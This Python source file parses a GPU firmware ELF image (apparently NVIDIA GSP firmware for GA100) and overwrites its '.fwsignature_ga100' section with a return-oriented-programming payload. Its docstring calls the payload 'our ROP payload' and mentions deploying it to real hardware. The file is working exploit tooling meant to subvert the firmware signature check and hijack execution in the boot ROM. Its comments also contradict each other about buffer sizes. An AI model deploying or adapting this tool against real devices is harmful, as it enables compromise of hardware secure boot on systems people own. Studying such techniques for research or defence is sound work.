import struct
import sys
import os
from pathlib import Path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.constants import get


def _parse_section_headers(gsp: bytearray):
    e_shoff     = struct.unpack_from("<Q", gsp, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", gsp, 0x3A)[0]
    e_shnum     = struct.unpack_from("<H", gsp, 0x3C)[0]
    e_shstrndx  = struct.unpack_from("<H", gsp, 0x3E)[0]

    shdr_total = e_shnum * e_shentsize
    shdrs = bytearray(gsp[e_shoff : e_shoff + shdr_total])

    strtab_hdr_off = e_shstrndx * e_shentsize
    strtab_off = struct.unpack_from("<Q", shdrs, strtab_hdr_off + 0x18)[0]
    strtab_sz  = struct.unpack_from("<Q", shdrs, strtab_hdr_off + 0x20)[0]
    strtab = bytes(gsp[strtab_off : strtab_off + strtab_sz])

    return e_shoff, e_shentsize, shdrs, strtab, strtab_hdr_off


def _find_signature_section(shdrs: bytearray, e_shentsize: int,
                             strtab: bytes, signature_section: bytes):
    for i in range(len(shdrs) // e_shentsize):
        base = i * e_shentsize
        name_idx = struct.unpack_from("<I", shdrs, base)[0]
        end = strtab.find(b"\x00", name_idx)
        if end == -1:
            end = len(strtab)
        if strtab[name_idx:end] == signature_section:
            return i, struct.unpack_from("<Q", shdrs, base + 0x18)[0]
    raise ValueError(f"Section {signature_section.decode()} not found in ELF")


def patch_gsp(input_path: str, payload: bytes, output_path: str) -> None:
    """Patch the .fwsignature_ga100 ELF section with our ROP payload.

    The on-disk section is 0x1000 (4 KB) — only the signature (last 32
    bytes) is the HMAC. The actual DMEM buffer that the BootROM loads
    is 0xF800 (62 KB) and is created at runtime by the kernel.

    We use a hybrid approach: the payload we write can be EITHER the
    62KB DMEM size OR the 4KB section size. For testing the 4KB patch
    fits cleanly. For real-hardware deploy, the kernel re-creates a
    62KB buffer.
    """
    signature_section = get('elf.signature_section').encode()
    gsp = bytearray(Path(input_path).read_bytes())

    if struct.unpack_from(">I", gsp, 0)[0] != get('elf.header_magic'):
        raise ValueError(f"{input_path} is not an ELF file")

    e_shoff, e_shentsize, shdrs, strtab, strtab_hdr_off = _parse_section_headers(gsp)
    sig_idx, sig_file_off = _find_signature_section(
        shdrs, e_shentsize, strtab, signature_section)

    # Read the original section size from the section header
    orig_size = struct.unpack_from("<Q", shdrs, sig_idx * e_shentsize + 0x20)[0]

    # Always write exactly to the section size. The payload (63KB DMEM buffer)
    # is loaded by the kernel at runtime, not from the ELF file. The on-disk
    # section is only 4KB and must stay that way to avoid breaking the ELF format.
    if len(payload) > orig_size:
        # Truncate to section size (kernel will re-create full DMEM at runtime)
        payload = payload[:orig_size]
    elif len(payload) < orig_size:
        # Pad with zeros to section size
        payload = payload + b"\x00" * (orig_size - len(payload))

    gsp[sig_file_off : sig_file_off + len(payload)] = payload

    # Ensure buffer is large enough for section headers if they're beyond payload
    required_size = e_shoff + len(shdrs)
    if len(gsp) < required_size:
        gsp.extend(b"\x00" * (required_size - len(gsp)))

    # Write updated section headers back to original location in the file
    gsp[e_shoff : e_shoff + len(shdrs)] = shdrs

    Path(output_path).write_bytes(bytes(gsp))
